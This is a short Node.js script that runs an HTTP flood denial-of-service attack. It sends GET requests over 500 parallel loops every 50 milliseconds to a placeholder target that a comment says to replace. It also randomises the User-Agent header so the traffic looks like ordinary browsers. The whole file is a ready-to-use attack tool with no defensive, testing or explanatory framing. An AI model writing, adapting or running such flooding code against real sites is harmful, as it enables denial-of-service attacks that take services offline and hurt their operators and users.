const http = require('http');

const target = 'http://example.com'; // Replace with target URL
const connections = 500; // Number of simultaneous connections

function rawHttpFlood() {
    const options = {
        hostname: target.replace('http://', '').replace('https://', ''),
        port: 80,
        method: 'GET',
        headers: {
            'User-Agent': `Mozilla/5.0 (Windows NT ${Math.floor(Math.random() * 10)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.${Math.floor(Math.random() * 500)} Safari/537.36`,
            'Accept': '*/*',
            'Connection': 'keep-alive',
        },
    };

    const req = http.request(options, (res) => {
        console.log(`[RAW Request] Status Code: ${res.statusCode}`);
    });

    req.on('error', (e) => {
        console.error(`Error: ${e.message}`);
    });

    req.end();
}

// Flood with multiple connections
for (let i = 0; i < connections; i++) {
    setInterval(rawHttpFlood, 50); // Send requests every 50ms
}